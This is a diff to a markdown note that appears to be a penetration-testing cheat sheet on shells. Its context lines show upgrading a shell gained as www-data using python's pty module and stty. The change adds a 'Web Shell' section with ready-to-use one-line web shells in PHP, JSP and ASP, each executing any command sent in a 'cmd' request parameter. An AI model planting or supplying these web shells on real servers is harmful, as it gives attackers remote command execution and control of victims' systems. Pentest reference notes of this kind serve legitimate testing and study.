@@ -115,12 +115,20 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 		www-data@remotehost$ export TERM=xterm-256color
 		www-data@remotehost$ stty rows 67 columns 318
 		```
+
+## Web Shell
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+<% eval request("cmd") %>
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTkyODc3MDU1NSwxODk3OTI4NTE2LC0xMT
-E4MjIwNDMzLDExMzUwNTI2ODQsLTExNzk3NTEyMTUsLTE5NjQ5
-NDM4ODgsMTQ2MjE1MTkzLDY4MTMzMTc0OSw5MjIyNDU1MDcsMT
-QxNjU5OTA3MiwtNTcyODQ4MDQxLDE1MzUyMzQ5NjEsNDA4NDI4
-OTg1LC0xNDc0MjAzNjI5LC0xMDAxMzcwMDQyLC0xNTkzOTA0Mj
-MyLDY4MjcwMjY1OCwtNTc4MzIxMTkwLDgxMTA2OTAxNSwtMjA4
-ODc0NjYxMl19
+eyJoaXN0b3J5IjpbMTE5MzgxMjE4MSwtOTI4NzcwNTU1LDE4OT
+c5Mjg1MTYsLTExMTgyMjA0MzMsMTEzNTA1MjY4NCwtMTE3OTc1
+MTIxNSwtMTk2NDk0Mzg4OCwxNDYyMTUxOTMsNjgxMzMxNzQ5LD
+kyMjI0NTUwNywxNDE2NTk5MDcyLC01NzI4NDgwNDEsMTUzNTIz
+NDk2MSw0MDg0Mjg5ODUsLTE0NzQyMDM2MjksLTEwMDEzNzAwND
+IsLTE1OTM5MDQyMzIsNjgyNzAyNjU4LC01NzgzMjExOTAsODEx
+MDY5MDE1XX0=
 -->
